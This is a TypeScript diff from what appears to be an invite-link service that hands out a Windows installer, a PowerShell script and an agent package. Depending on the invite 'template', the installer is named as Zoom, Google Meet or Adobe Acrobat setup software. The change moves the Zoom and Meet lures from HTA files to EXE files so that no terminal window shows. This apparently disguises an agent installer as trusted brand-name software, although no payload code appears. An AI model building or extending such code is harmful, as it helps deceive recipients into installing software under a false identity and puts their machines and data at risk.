@@ -69,16 +69,14 @@ export function installerBatFilename(template?: string | null): string {
 
 export function installerGuiFilename(template?: string | null): string {
   const t = normalizeTemplate(template);
-  if (t === 'google_meet') return 'GoogleMeet-Setup.hta';
+  if (t === 'google_meet') return 'GoogleMeet-Setup.exe';
   if (t === 'adobe') return 'AdobeAcrobat-Setup.exe';
-  return 'ZoomClient-Setup.hta';
+  return 'ZoomClient-Setup.exe';
 }
 
-/** Zoom/Meet use the HTA progress UI; Adobe uses the embedded EXE stub. */
-export function installerDownloadPath(template?: string | null): string {
-  const t = normalizeTemplate(template);
-  if (t === 'adobe') return 'setup.exe';
-  return 'setup.hta';
+/** All templates use the GUI EXE installer (no terminal). */
+export function installerDownloadPath(_template?: string | null): string {
+  return 'setup.exe';
 }
 
 /** Marker written after the Windows stub PE; stub reads JSON that follows. */
@@ -343,7 +341,7 @@ export class GuestAccessService {
       organizationSlug: org?.slug ?? '',
       expiresAt: link.expiresAt.toISOString(),
       remainingUses: Math.max(0, link.maxUses - link.usedCount),
-      windowsInstallerUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/${installerDownloadPath(link.inviteTemplate)}?v=29`,
+      windowsInstallerUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/${installerDownloadPath(link.inviteTemplate)}?v=30`,
       installerFileName: installerGuiFilename(link.inviteTemplate),
       windowsScriptUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/windows.ps1`,
       agentPackageUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/agent-package.zip`,
